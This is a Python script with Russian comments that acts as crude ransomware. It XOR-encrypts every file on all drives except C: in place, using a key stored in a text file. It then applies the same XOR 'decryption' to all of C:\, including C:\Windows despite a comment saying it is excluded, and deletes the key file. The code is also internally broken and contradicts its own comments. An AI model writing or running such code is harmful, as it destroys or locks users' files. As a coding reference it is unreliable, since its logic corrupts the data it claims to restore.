import os
import shutil
import sys

# Генерация случайного ключа для шифрования и дешифрования
def generate_key(length=16):
    import random
    import string
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Определение пути для сохранения ключа
KEY_FILE_PATH = os.path.expanduser("C:\encryption_key.txt")

# Проверка, существует ли файл с ключом
if os.path.exists(KEY_FILE_PATH):
    # Чтение ключа из файла
    with open(KEY_FILE_PATH, "r") as key_file:
        ENCRYPTION_KEY = DECRYPTION_KEY = key_file.read().strip()
else:
    # Генерация нового ключа
    ENCRYPTION_KEY = DECRYPTION_KEY = generate_key()
    # Сохранение ключа в файл
    with open(KEY_FILE_PATH, "w") as key_file:
        key_file.write(ENCRYPTION_KEY)

print("Ключ шифрования и дешифрования:", ENCRYPTION_KEY)

# Функция для шифрования файла
def encrypt_file(file_path):
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = bytearray(len(file_data))
    for i, byte in enumerate(file_data):
        encrypted_data[i] = byte ^ ord(ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)])
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Функция для шифрования всех файлов в директории
def encrypt_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            # Исключаем директорию C:\Windows
            if not file_path.startswith("C:\\Windows"):
                encrypt_file(file_path)

# Получаем список всех дисков
available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]

# Шифруем все диски, кроме C:\Windows
for drive in available_drives:
    if drive != "C:":
        encrypt_directory(drive)

# Функция для дешифрования файла
def decrypt_file(file_path):
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = bytearray(len(encrypted_data))
    for i, byte in enumerate(encrypted_data):
        decrypted_data[i] = byte ^ ord(DECRYPTION_KEY[i % len(DECRYPTION_KEY)])
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

# Функция для дешифрования всех файлов в директории
def decrypt_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path)

# Дешифруем директорию C:\, кроме C:\Windows
decrypt_directory("C:\\")

# Удаляем файл с ключом после использования
os.remove(KEY_FILE_PATH)

# Завершаем работу скрипта
sys.exit(0)
